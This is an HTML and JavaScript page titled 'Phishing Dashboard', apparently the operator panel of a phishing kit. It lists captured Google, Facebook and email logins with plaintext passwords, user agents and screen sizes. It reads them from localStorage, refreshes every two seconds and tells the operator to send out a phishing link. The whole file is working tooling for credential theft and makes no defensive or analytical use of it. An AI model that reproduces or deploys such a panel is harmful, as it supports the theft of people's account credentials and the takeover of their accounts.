<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Dashboard</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:#1a1a2e;padding:20px;color:#fff}.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:12px;text-align:center;margin-bottom:30px}.header h1{font-size:28px;margin-bottom:10px}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat{background:rgba(255,255,255,.1);padding:20px;border-radius:12px;text-align:center}.stat h3{font-size:32px;font-weight:700;color:#4ade80;margin-bottom:5px}.stat p{color:#cbd5e1}.creds{ background:rgba(255,255,255,.05);border-radius:12px;overflow:hidden}.creds h2{padding:24px 24px 0;background:rgba(255,255,255,.1);margin:0}.list{padding:0 24px 24px;max-height:60vh;overflow:auto}.cred{margin:16px 0;padding:20px;background:rgba(66,133,244,.2);border-radius:12px;border-left:4px solid #4ade80}.cred-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}.cred-id{font-weight:700;color:#4ade80}.cred-time{color:#cbd5e1;font-size:14px}.cred-details{font-family:monospace;background:rgba(0,0,0,.3);padding:12px;border-radius:8px;margin-top:8px}.empty{padding:40px;text-align:center;color:#cbd5e1;font-size:18px}.clear-btn{background:#ef4444;color:#fff;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-weight:600;float:right;margin:20px}</style></head><body><div class="header"><h1>🎣 Phishing Dashboard</h1><p>Total Captures: <span id="total">0</span></p></div><div class="stats"><div class="stat"><h3 id="google-count">0</h3><p>Google Logins</p></div><div class="stat"><h3 id="facebook-count">0</h3><p>Facebook Logins</p></div><div class="stat"><h3 id="email-count">0</h3><p>Email Logins</p></div></div><div class="creds"><h2>Captured Credentials<button class="clear-btn" onclick="clearAll()">Clear All</button></h2><div class="list" id="creds-list"><div class="empty">Send your phishing link to start capturing! 📧</div></div></div><script>function loadCaptures(){try{const data=JSON.parse(localStorage.getItem('phish_captures')||'[]');document.getElementById('total').textContent=data.length;const counts={Google:0,Facebook:0,Email:0};data.forEach(c=>{counts[c.type]++});document.getElementById('google-count').textContent=counts.Google;document.getElementById('facebook-count').textContent=counts.Facebook;document.getElementById('email-count').textContent=counts.Email;const list=document.getElementById('creds-list');list.innerHTML='';if(data.length===0){list.innerHTML='<div class="empty">Send your phishing link to start capturing! 📧</div>';return;}data.forEach(cred=>{const div=document.createElement('div');div.className='cred';div.innerHTML=`<div class="cred-header"><span class="cred-id">#${cred.id}</span><span class="cred-time">${cred.time}</span></div><div><strong>${cred.type}:</strong> ${cred.email}</div><div style="color:#f87171;font-family:monospace;font-size:16px;font-weight:700;margin:8px 0">${cred.password}</div><div class="cred-details">${cred.ua}<br>📱 ${cred.screen}</div>`;list.appendChild(div);});}catch(e){console.error(e);}}function clearAll(){if(confirm('Clear all captures?')){localStorage.removeItem('phish_captures');loadCaptures();}}loadCaptures();setInterval(loadCaptures,2000);</script></body></html>
